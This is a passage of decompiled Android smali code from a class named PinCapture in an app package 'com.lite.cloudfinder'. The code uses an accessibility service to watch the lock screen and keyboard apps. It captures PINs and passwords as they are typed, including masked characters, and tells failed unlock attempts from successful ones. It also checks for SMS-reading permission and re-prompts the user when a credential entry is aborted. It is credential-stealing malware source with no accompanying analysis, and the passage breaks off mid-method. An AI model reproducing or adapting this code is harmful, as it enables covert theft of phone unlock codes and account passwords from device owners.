    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 563
    invoke-static {p0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->finalizeAttempt(Landroid/content/Context;Z)V

    .line 565
    :cond_0
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->hasMask(Ljava/lang/String;)Z

    move-result v0

    const-string v4, "password"

    const/16 v5, 0x20

    const/4 v6, 0x4

    if-eqz v0, :cond_4

    .line 566
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->tailAfterMask(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 567
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_3

    .line 568
    sput-object v4, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 569
    sget-object p1, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->length()I

    move-result v1

    if-lt v1, v5, :cond_1

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 570
    :cond_1
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 571
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->length()I

    move-result p1

    if-lt p1, v6, :cond_2

    move v2, v3

    :cond_2
    invoke-static {p0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    goto :goto_0

    .line 573
    :cond_3
    new-instance p0, Ljava/lang/StringBuilder;

    const-string v0, "mask only len="

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " buf="

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p1, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->length()I

    move-result p1

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v1, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void

    .line 577
    :cond_4
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->isDigits(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-lt v0, v6, :cond_5

    .line 578
    const-string v0, "pin"

    sput-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 579
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->setValue(Ljava/lang/String;)V

    .line 580
    invoke-static {p0, v3}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    return-void

    .line 583
    :cond_5
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-ne v0, v3, :cond_8

    .line 584
    sput-object v4, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 585
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v1

    if-lt v1, v5, :cond_6

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 586
    :cond_6
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 587
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result p1

    if-lt p1, v6, :cond_7

    move v2, v3

    :cond_7
    invoke-static {p0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    return-void

    .line 590
    :cond_8
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->isCjk(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    return-void

    .line 593
    :cond_9
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-lt v0, v6, :cond_a

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-gt v0, v5, :cond_a

    invoke-virtual {p1, v5}, Ljava/lang/String;->indexOf(I)I

    move-result v0

    if-gez v0, :cond_a

    .line 594
    sput-object v4, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 595
    invoke-static {p1}, Lcom/lite/cloudfinder/pin/PinCapture;->setValue(Ljava/lang/String;)V

    .line 596
    invoke-static {p0, v3}, Lcom/lite/cloudfinder/pin/PinCapture;->flush(Landroid/content/Context;Z)V

    :cond_a
    return-void
.end method

.method private static hasMask(Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x0

    move v1, v0

    .line 601
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_2

    .line 602
    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const/16 v3, 0x2022

    if-eq v2, v3, :cond_1

    const/16 v3, 0x25cf

    if-eq v2, v3, :cond_1

    const/16 v3, 0x2a

    if-eq v2, v3, :cond_1

    const/16 v3, 0x25c9

    if-eq v2, v3, :cond_1

    const/16 v3, 0x2b24

    if-ne v2, v3, :cond_0

    goto :goto_1

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    :goto_1
    const/4 p0, 0x1

    return p0

    :cond_2
    return v0
.end method

.method private static hasSms(Landroid/content/Context;)Z
    .locals 2

    const/4 v0, 0x0

    .line 249
    :try_start_0
    const-string v1, "android.permission.READ_SMS"

    invoke-virtual {p0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-nez p0, :cond_0

    const/4 v0, 0x1

    :catchall_0
    :cond_0
    return v0
.end method

.method private static isCjk(Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x0

    move v1, v0

    .line 622
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_1

    .line 623
    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const/16 v3, 0x4e00

    if-lt v2, v3, :cond_0

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const v3, 0x9fa5

    if-gt v2, v3, :cond_0

    const/4 p0, 0x1

    return p0

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    return v0
.end method

.method private static isCredentialForeground()Z
    .locals 3

    const/4 v0, 0x0

    .line 173
    :try_start_0
    sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->svcRef:Landroid/accessibilityservice/AccessibilityService;

    if-nez v1, :cond_0

    return v0

    .line 175
    :cond_0
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_1

    return v0

    .line 177
    :cond_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    if-nez v2, :cond_2

    .line 178
    const-string v2, ""

    goto :goto_0

    :cond_2
    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 179
    :goto_0
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 180
    const-string v1, "settings"

    invoke-virtual {v2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_3

    const-string v1, "biometrics"

    invoke-virtual {v2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_3

    const-string v1, "systemui"

    invoke-virtual {v2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v1, :cond_4

    :cond_3
    const/4 v0, 0x1

    :catchall_0
    :cond_4
    return v0
.end method

.method private static isDelete(Ljava/lang/String;)Z
    .locals 2

    .line 721
    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 722
    const-string v1, "\u5220\u9664"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "\u9000\u683c"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "delete"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 723
    const-string v0, "\u232b"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    invoke-virtual {p0, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result p0

    if-ltz p0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method private static isDeviceLocked(Landroid/content/Context;)Z
    .locals 2

    const/4 v0, 0x0

    .line 163
    :try_start_0
    const-string v1, "keyguard"

    .line 164
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/KeyguardManager;

    if-eqz p0, :cond_0

    .line 165
    invoke-virtual {p0}, Landroid/app/KeyguardManager;->isDeviceLocked()Z

    move-result p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz p0, :cond_0

    const/4 v0, 0x1

    :catchall_0
    :cond_0
    return v0
.end method

.method private static isDigits(Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x0

    move v1, v0

    .line 735
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_2

    .line 736
    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const/16 v3, 0x30

    if-lt v2, v3, :cond_1

    const/16 v3, 0x39

    if-le v2, v3, :cond_0

    goto :goto_1

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    :goto_1
    return v0

    .line 739
    :cond_2
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result p0

    if-lez p0, :cond_3

    const/4 v0, 0x1

    :cond_3
    return v0
.end method

.method private static isEnter(Ljava/lang/String;)Z
    .locals 2

    .line 727
    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 728
    const-string v1, "\u786e\u5b9a"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "\u5b8c\u6210"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "\u767b\u5f55"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "enter"

    .line 729
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "done"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "go"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "ok"

    .line 730
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "\u786e\u8ba4"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "\u2192"

    .line 731
    invoke-virtual {p0, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result p0

    if-ltz p0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method private static isIme(Ljava/lang/String;)Z
    .locals 1

    .line 704
    const-string v0, "honeyboard"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "inputmethod"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "gboard"

    .line 705
    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "qqpinyin"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "sogou"

    .line 706
    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "baidu.input"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "swiftkey"

    .line 707
    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "keyboard"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-eqz p0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method private static isKeyguardLocked(Landroid/content/Context;)Z
    .locals 2

    const/4 v0, 0x0

    .line 712
    :try_start_0
    const-string v1, "keyguard"

    .line 713
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/KeyguardManager;

    if-eqz p0, :cond_0

    .line 714
    invoke-virtual {p0}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz p0, :cond_0

    const/4 v0, 0x1

    :catchall_0
    :cond_0
    return v0
.end method

.method private static isMask(Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x0

    move v1, v0

    .line 743
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_1

    .line 744
    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const/16 v3, 0x2022

    if-eq v2, v3, :cond_0

    const/16 v3, 0x25cf

    if-eq v2, v3, :cond_0

    const/16 v3, 0x2a

    if-eq v2, v3, :cond_0

    const/16 v3, 0x25c9

    if-eq v2, v3, :cond_0

    const/16 v3, 0x2b24

    if-eq v2, v3, :cond_0

    return v0

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 749
    :cond_1
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result p0

    if-lez p0, :cond_2

    const/4 v0, 0x1

    :cond_2
    return v0
.end method

.method private static isWrongHint(Ljava/lang/String;)Z
    .locals 2

    .line 696
    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 697
    const-string v1, "\u5bc6\u7801\u9519\u8bef"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "\u4e0d\u6b63\u786e"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "\u518d\u8bd5"

    .line 698
    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-gez v1, :cond_1

    const-string v1, "\u91cd\u8bd5"

    invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result p0

    if-gez p0, :cond_1

    const-string p0, "wrong"

    .line 699
    invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-nez p0, :cond_1

    const-string p0, "incorrect"

    invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-nez p0, :cond_1

    const-string p0, "try again"

    .line 700
    invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-nez p0, :cond_1

    const-string p0, "failed"

    invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-eqz p0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method private static match(Ljava/lang/String;)Z
    .locals 6

    .line 689
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->PKGS:[Ljava/lang/String;

    array-length v1, v0

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    const/4 v4, 0x1

    if-ge v3, v1, :cond_1

    aget-object v5, v0, v3

    .line 690
    invoke-virtual {v5, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    return v4

    :cond_0
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 692
    :cond_1
    const-string v0, "systemui"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "screenlock"

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-eqz p0, :cond_3

    :cond_2
    move v2, v4

    :cond_3
    return v2
.end method

.method private static nodeText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 4

    const/4 v0, 0x0

    .line 363
    :try_start_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-object v1, v0

    :goto_0
    if-eqz v1, :cond_2

    .line 369
    :try_start_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_0

    .line 370
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    move-result v3

    if-lez v3, :cond_0

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_0
    if-nez v0, :cond_1

    .line 372
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_1

    .line 373
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    move-result v3

    if-lez v3, :cond_1

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 378
    :catchall_1
    :cond_1
    :try_start_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    :catchall_2
    :cond_2
    if-nez v0, :cond_3

    .line 383
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_3

    .line 384
    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_3

    .line 385
    invoke-interface {p0}, Ljava/util/List;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    invoke-interface {p0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/CharSequence;

    if-eqz p0, :cond_3

    .line 386
    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_3
    return-object v0
.end method

.method public static onAborted(Landroid/content/Context;)V
    .locals 2

    .line 196
    sget-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->flowStarted:Z

    if-eqz v0, :cond_0

    return-void

    .line 197
    :cond_0
    const-string v0, "PinCapture"

    const-string v1, "credential aborted -> reprompt"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-wide/16 v0, 0x5dc

    .line 198
    invoke-static {p0, v0, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->reprompt(Landroid/content/Context;J)V

    return-void
.end method

.method public static onEvent(Landroid/content/Context;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 17

    move-object/from16 v0, p0

    .line 258
    const-string v1, "PinCapture"

    .line 0
    const-string v2, "wrong hint: "

    const-string v3, "new session: "

    const-string v4, "evt="

    const-string v5, "wrong hint(window): "

    const-string v6, "idle reset ("

    .line 258
    :try_start_0
    sget-boolean v7, Lcom/lite/cloudfinder/pin/PinCapture;->armed:Z

    if-eqz v7, :cond_14

    if-nez p1, :cond_0

    goto/16 :goto_2

    .line 260
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v7
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 261
    const-string v8, ""

    if-nez v7, :cond_1

    move-object v7, v8

    goto :goto_0

    :cond_1
    :try_start_1
    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    .line 263
    :goto_0
    invoke-static {v7}, Lcom/lite/cloudfinder/pin/PinCapture;->match(Ljava/lang/String;)Z

    move-result v9

    .line 264
    invoke-static {v7}, Lcom/lite/cloudfinder/pin/PinCapture;->isIme(Ljava/lang/String;)Z

    move-result v10

    if-nez v9, :cond_2

    if-nez v10, :cond_2

    return-void

    :cond_2
    if-eqz v10, :cond_3

    .line 266
    invoke-static/range {p0 .. p0}, Lcom/lite/cloudfinder/pin/PinCapture;->isKeyguardLocked(Landroid/content/Context;)Z

    move-result v10

    if-nez v10, :cond_3

    return-void

    .line 268
    :cond_3
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    .line 269
    sget-wide v12, Lcom/lite/cloudfinder/pin/PinCapture;->lastEventTs:J
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    sub-long v12, v10, v12

    const-wide/16 v14, 0x1388

    cmp-long v12, v12, v14

    const-string v13, "unknown"

    const/4 v14, 0x0

    if-lez v12, :cond_4

    .line 270
    :try_start_2
    sget-object v12, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v12, v14}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 271
    sput-object v13, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 272
    sput-object v8, Lcom/lite/cloudfinder/pin/PinCapture;->lastValue:Ljava/lang/String;

    .line 273
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-wide v15, Lcom/lite/cloudfinder/pin/PinCapture;->lastEventTs:J

    sub-long v14, v10, v15

    invoke-virtual {v12, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v14, "ms) -> "

    invoke-virtual {v12, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v1, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 275
    :cond_4
    sput-wide v10, Lcom/lite/cloudfinder/pin/PinCapture;->lastEventTs:J

    .line 276
    sget-object v10, Lcom/lite/cloudfinder/pin/PinCapture;->lastPkg:Ljava/lang/String;

    invoke-virtual {v7, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_5

    .line 277
    sput-object v7, Lcom/lite/cloudfinder/pin/PinCapture;->lastPkg:Ljava/lang/String;

    .line 281
    :cond_5
    const-string v10, "systemui"

    invoke-virtual {v7, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    const/4 v11, 0x1

    if-eqz v10, :cond_6

    sget-object v10, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    move-result v10

    if-lez v10, :cond_6

    .line 282
    invoke-static/range {p0 .. p0}, Lcom/lite/cloudfinder/pin/PinCapture;->isKeyguardLocked(Landroid/content/Context;)Z

    move-result v10

    if-nez v10, :cond_6

    invoke-static/range {p0 .. p0}, Lcom/lite/cloudfinder/pin/PinCapture;->isDeviceLocked(Landroid/content/Context;)Z

    move-result v10

    if-nez v10, :cond_6

    .line 283
    const-string v10, "keyguard gone -> attempt ok"

    invoke-static {v1, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 284
    invoke-static {v0, v11}, Lcom/lite/cloudfinder/pin/PinCapture;->finalizeAttempt(Landroid/content/Context;Z)V

    .line 287
    :cond_6
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v10

    const/16 v12, 0x20

    if-ne v10, v12, :cond_b

    .line 291
    invoke-static/range {p1 .. p1}, Lcom/lite/cloudfinder/pin/PinCapture;->nodeText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_7

    .line 293
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v4

    if-eqz v4, :cond_7

    .line 294
    invoke-interface {v4}, Ljava/util/List;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_7

    const/4 v6, 0x0

    invoke-interface {v4, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    if-eqz v7, :cond_7

    invoke-interface {v4, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/CharSequence;

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_7
    if-eqz v2, :cond_8

    .line 296
    invoke-static {v2}, Lcom/lite/cloudfinder/pin/PinCapture;->isWrongHint(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_8

    .line 297
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v2, 0x0

    .line 298
    invoke-static {v0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->finalizeAttempt(Landroid/content/Context;Z)V

    return-void

    :cond_8
    if-eqz v2, :cond_a

    .line 302
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 303
    const-string v4, "PIN"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_9

    const-string v4, "\u5bc6\u7801"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_9

    const-string v4, "\u56fe\u6848"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_9

    const-string v4, "password"

    .line 304
    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_9

    const-string v4, "pin"

